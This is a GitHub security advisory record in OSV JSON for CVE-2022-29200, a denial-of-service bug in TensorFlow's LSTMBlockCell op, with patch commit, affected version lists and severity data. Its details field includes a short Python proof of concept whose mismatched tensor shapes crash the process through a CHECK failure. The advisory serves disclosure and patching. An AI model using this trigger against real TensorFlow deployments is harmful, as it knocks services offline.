{
  "id": "GHSA-2vv3-56qg-g2cf",
  "summary": "Missing validation causes denial of service via `LSTMBlockCell`",
  "details": "### Impact\nThe implementation of [`tf.raw_ops.LSTMBlockCell`](https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/core/kernels/rnn/lstm_ops.cc) does not fully validate the input arguments. This results in a `CHECK`-failure which can be used to trigger a denial of service attack:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.LSTMBlockCell( \n  x=tf.constant(0.837607, shape=[28,29], dtype=tf.float32),\n  cs_prev=tf.constant(0, shape=[28,17], dtype=tf.float32),\n  h_prev=tf.constant(0.592631638, shape=[28,17], dtype=tf.float32),\n  w=tf.constant(0.887386262, shape=[46,68], dtype=tf.float32),\n  wci=tf.constant(0, shape=[], dtype=tf.float32),\n  wcf=tf.constant(0, shape=[17], dtype=tf.float32),\n  wco=tf.constant(0.592631638, shape=[28,17], dtype=tf.float32),\n  b=tf.constant(0.75259006, shape=[68], dtype=tf.float32),\n  forget_bias=1, cell_clip=0, use_peephole=False)\n``` \n  \nThe code does not validate the ranks of any of the arguments to this API call. This results in `CHECK`-failures when the elements of the tensor are accessed.\n    \n### Patches\nWe have patched the issue in GitHub commit [803404044ae7a1efac48ba82d74111fce1ddb09a](https://github.com/tensorflow/tensorflow/commit/803404044ae7a1efac48ba82d74111fce1ddb09a).\n    \nThe fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.\n\n### For more information                \nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n    \n### Attribution\nThis vulnerability has been reported by Neophytos Christou from Secure Systems Lab at Brown University.\n",
  "aliases": [
    "BIT-tensorflow-2022-29200",
    "CVE-2022-29200"
  ],
  "modified": "2024-02-16T08:21:41.377063Z",
  "published": "2022-05-24T22:10:01Z",
  "database_specific": {
    "nvd_published_at": "2022-05-20T22:16:00Z",
    "cwe_ids": [
      "CWE-1284",
      "CWE-20"
    ],
    "severity": "MODERATE",
    "github_reviewed": true,
    "github_reviewed_at": "2022-05-24T22:10:01Z"
  },
  "references": [
    {
      "type": "WEB",
      "url": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-2vv3-56qg-g2cf"
    },
    {
      "type": "ADVISORY",
      "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-29200"
    },
    {
      "type": "WEB",
      "url": "https://github.com/tensorflow/tensorflow/commit/803404044ae7a1efac48ba82d74111fce1ddb09a"
    },
    {
      "type": "PACKAGE",
      "url": "https://github.com/tensorflow/tensorflow"
    },
    {
      "type": "WEB",
      "url": "https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/core/kernels/rnn/lstm_ops.cc"
    },
    {
      "type": "WEB",
      "url": "https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4"
    },
    {
      "type": "WEB",
      "url": "https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2"
    },
    {
      "type": "WEB",
      "url": "https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1"
    },
    {
      "type": "WEB",
      "url": "https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0"
    }
  ],
  "affected": [
    {
      "package": {
        "name": "tensorflow",
        "ecosystem": "PyPI",
        "purl": "pkg:pypi/tensorflow"
      },
      "ranges": [
        {
          "type": "ECOSYSTEM",
          "events": [
            {
              "introduced": "0"
            },
            {
              "fixed": "2.6.4"
            }
          ]
        }
      ],
      "versions": [
        "0.12.0",
        "0.12.1",
        "1.0.0",
        "1.0.1",
        "1.1.0",
        "1.10.0",
        "1.10.1",
        "1.11.0",
        "1.12.0",
        "1.12.2",
        "1.12.3",
        "1.13.1",
        "1.13.2",
        "1.14.0",
        "1.15.0",
        "1.15.2",
        "1.15.3",
        "1.15.4",
        "1.15.5",
        "1.2.0",
        "1.2.1",
        "1.3.0",
        "1.4.0",
        "1.4.1",
        "1.5.0",
        "1.5.1",
        "1.6.0",
        "1.7.0",
        "1.7.1",
        "1.8.0",
        "1.9.0",
        "2.0.0",
        "2.0.1",
        "2.0.2",
        "2.0.3",
        "2.0.4",
        "2.1.0",
        "2.1.1",
        "2.1.2",
        "2.1.3",
        "2.1.4",
        "2.2.0",
        "2.2.1",
        "2.2.2",
        "2.2.3",
        "2.3.0",
        "2.3.1",
        "2.3.2",
        "2.3.3",
        "2.3.4",
        "2.4.0",
        "2.4.1",
        "2.4.2",
        "2.4.3",
        "2.4.4",
        "2.5.0",
        "2.5.1",
        "2.5.2",
        "2.5.3",
        "2.6.0",
        "2.6.0rc0",
        "2.6.0rc1",
        "2.6.0rc2",
        "2.6.1",
        "2.6.2",
        "2.6.3"
      ],
      "database_specific": {
        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/05/GHSA-2vv3-56qg-g2cf/GHSA-2vv3-56qg-g2cf.json"
      }
    },
    {
      "package": {
        "name": "tensorflow",
        "ecosystem": "PyPI",
        "purl": "pkg:pypi/tensorflow"
      },
      "ranges": [
        {
          "type": "ECOSYSTEM",
          "events": [
            {
              "introduced": "2.7.0"
            },
            {
              "fixed": "2.7.2"
            }
          ]
        }
      ],
      "versions": [
        "2.7.0",
        "2.7.1"
      ],
      "database_specific": {
        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/05/GHSA-2vv3-56qg-g2cf/GHSA-2vv3-56qg-g2cf.json"
      }
    },
    {
      "package": {
        "name": "tensorflow",
        "ecosystem": "PyPI",
        "purl": "pkg:pypi/tensorflow"
      },
      "ranges": [
        {
          "type": "ECOSYSTEM",
          "events": [
            {
              "introduced": "2.8.0"
            },
            {
              "fixed": "2.8.1"
            }
          ]
        }
      ],
      "versions": [
        "2.8.0"
      ],
      "database_specific": {
        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/05/GHSA-2vv3-56qg-g2cf/GHSA-2vv3-56qg-g2cf.json"
      }
    },
    {
      "package": {
        "name": "tensorflow-cpu",
        "ecosystem": "PyPI",
        "purl": "pkg:pypi/tensorflow-cpu"
      },
      "ranges": [
        {
          "type": "ECOSYSTEM",
          "events": [
            {
              "introduced": "0"
            },
            {
              "fixed": "2.6.4"
            }
          ]
        }
      ],
      "versions": [
        "1.15.0",
        "2.1.0",
        "2.1.1",
        "2.1.2",
        "2.1.3",
        "2.1.4",
        "2.2.0",
        "2.2.1",
        "2.2.2",
        "2.2.3",
        "2.3.0",
        "2.3.1",
        "2.3.2",
        "2.3.3",
        "2.3.4",
        "2.4.0",
        "2.4.1",
        "2.4.2",
        "2.4.3",
        "2.4.4",
        "2.5.0",
        "2.5.1",
        "2.5.2",
        "2.5.3",
        "2.6.0",
        "2.6.1",
        "2.6.2",
        "2.6.3"
      ],
      "database_specific": {
        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/05/GHSA-2vv3-56qg-g2cf/GHSA-2vv3-56qg-g2cf.json"
      }
    },
    {
      "package": {
        "name": "tensorflow-cpu",
        "ecosystem": "PyPI",
        "purl": "pkg:pypi/tensorflow-cpu"
      },
      "ranges": [
        {
          "type": "ECOSYSTEM",
          "events": [
            {
              "introduced": "2.7.0"
            },
            {
              "fixed": "2.7.2"
            }
          ]
        }
      ],
      "versions": [
        "2.7.0",
        "2.7.1"
      ],
      "database_specific": {
        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/05/GHSA-2vv3-56qg-g2cf/GHSA-2vv3-56qg-g2cf.json"
      }
    },
    {
      "package": {
        "name": "tensorflow-cpu",
        "ecosystem": "PyPI",
        "purl": "pkg:pypi/tensorflow-cpu"
      },
      "ranges": [
        {
          "type": "ECOSYSTEM",
          "events": [
            {
              "introduced": "2.8.0"
            },
            {
              "fixed": "2.8.1"
            }
          ]
        }
      ],
      "versions": [
        "2.8.0"
      ],
      "database_specific": {
        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/05/GHSA-2vv3-56qg-g2cf/GHSA-2vv3-56qg-g2cf.json"
      }
    },
    {
      "package": {
        "name": "tensorflow-gpu",
        "ecosystem": "PyPI",
        "purl": "pkg:pypi/tensorflow-gpu"
      },
      "ranges": [
        {
          "type": "ECOSYSTEM",
          "events": [
            {
              "introduced": "0"
            },
            {
              "fixed": "2.6.4"
            }
          ]
        }
      ],
      "versions": [
        "0.12.0",
        "0.12.1",
        "1.0.0",
        "1.0.1",
        "1.1.0",
        "1.10.0",
        "1.10.1",
        "1.11.0",
        "1.12.0",
        "1.12.2",
        "1.12.3",
        "1.13.1",
        "1.13.2",
        "1.14.0",
        "1.15.0",
        "1.15.2",
        "1.15.3",
        "1.15.4",
        "1.15.5",
        "1.2.0",
        "1.2.1",
        "1.3.0",
        "1.4.0",
        "1.4.1",
        "1.5.0",
        "1.5.1",
        "1.6.0",
        "1.7.0",
        "1.7.1",
        "1.8.0",
        "1.9.0",
        "2.0.0",
        "2.0.1",
        "2.0.2",
        "2.0.3",
        "2.0.4",
        "2.1.0",
        "2.1.1",
        "2.1.2",
        "2.1.3",
        "2.1.4",
        "2.2.0",
        "2.2.1",
        "2.2.2",
        "2.2.3",
        "2.3.0",
        "2.3.1",
        "2.3.2",
        "2.3.3",
        "2.3.4",
        "2.4.0",
        "2.4.1",
        "2.4.2",
        "2.4.3",
        "2.4.4",
        "2.5.0",
        "2.5.1",
        "2.5.2",
        "2.5.3",
        "2.6.0",
        "2.6.1",
        "2.6.2",
        "2.6.3"
      ],
      "database_specific": {
        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/05/GHSA-2vv3-56qg-g2cf/GHSA-2vv3-56qg-g2cf.json"
      }
    },
    {
      "package": {
        "name": "tensorflow-gpu",
        "ecosystem": "PyPI",
        "purl": "pkg:pypi/tensorflow-gpu"
      },
      "ranges": [
        {
          "type": "ECOSYSTEM",
          "events": [
            {
              "introduced": "2.7.0"
            },
            {
              "fixed": "2.7.2"
            }
          ]
        }
      ],
      "versions": [
        "2.7.0",
        "2.7.1"
      ],
      "database_specific": {
        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/05/GHSA-2vv3-56qg-g2cf/GHSA-2vv3-56qg-g2cf.json"
      }
    },
    {
      "package": {
        "name": "tensorflow-gpu",
        "ecosystem": "PyPI",
        "purl": "pkg:pypi/tensorflow-gpu"
      },
      "ranges": [
        {
          "type": "ECOSYSTEM",
          "events": [
            {
              "introduced": "2.8.0"
            },
            {
              "fixed": "2.8.1"
            }
          ]
        }
      ],
      "versions": [
        "2.8.0"
      ],
      "database_specific": {
        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/05/GHSA-2vv3-56qg-g2cf/GHSA-2vv3-56qg-g2cf.json"
      }
    }
  ],
  "schema_version": "1.6.0",
  "severity": [
    {
      "type": "CVSS_V3",
      "score": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H"
    }
  ]
}